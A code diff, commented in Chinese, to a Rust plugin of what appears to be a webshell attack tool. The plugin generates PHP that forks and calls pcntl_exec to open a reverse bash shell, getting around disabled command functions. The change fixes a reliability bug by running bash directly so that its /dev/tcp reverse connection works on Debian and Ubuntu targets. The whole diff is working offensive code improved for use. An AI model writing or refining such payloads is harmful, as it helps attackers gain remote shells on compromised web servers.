@@ -897,7 +897,8 @@ impl FeaturePlugin for BypassReversePcntlPlugin {
             name: "Bypass·pcntl 反弹".into(),
             version: "1.0.0".into(),
             description:
-                "fork + pcntl_exec 反弹 bash（不依赖 proc_open/shell_exec，命令函数全禁时可用）。"
+                "fork + pcntl_exec 反弹 bash（不依赖 proc_open/shell_exec，命令函数全禁时可用）。\
+                 需要目标存在 /bin/bash —— 载荷走 bash 的 /dev/tcp 特性（dash 不支持）。"
                     .into(),
             category: "php".into(),
             languages: vec!["php".into()],
@@ -967,10 +968,12 @@ if (!function_exists('pcntl_fork') || !function_exists('pcntl_exec')) {{
 $pid = pcntl_fork();
 if ($pid === 0) {{
     if (function_exists('posix_setsid')) @posix_setsid();
-    // 子进程：exec 替换为反弹 bash
-    pcntl_exec('/bin/sh', array('-c', $cmd));
-    // 降级：直接 /bin/bash -i
-    pcntl_exec('/bin/bash', array('-c', '/bin/bash -i'));
+    // 直接 exec bash，不要经 /bin/sh：/dev/tcp 是 bash 专有特性，
+    // Debian/Ubuntu 下 /bin/sh 指向 dash，`sh -c` 会报
+    // "cannot create /dev/tcp/...: Directory nonexistent" 后静默退出，
+    // 表现为反弹一直连不上（Kali 等 sh→bash 的系统上才碰巧可用）。
+    // pcntl_exec 成功即替换进程映像、不返回。
+    pcntl_exec('/bin/bash', array('-c', $cmd));
     return;
 }}
 if ($pid > 0) {{
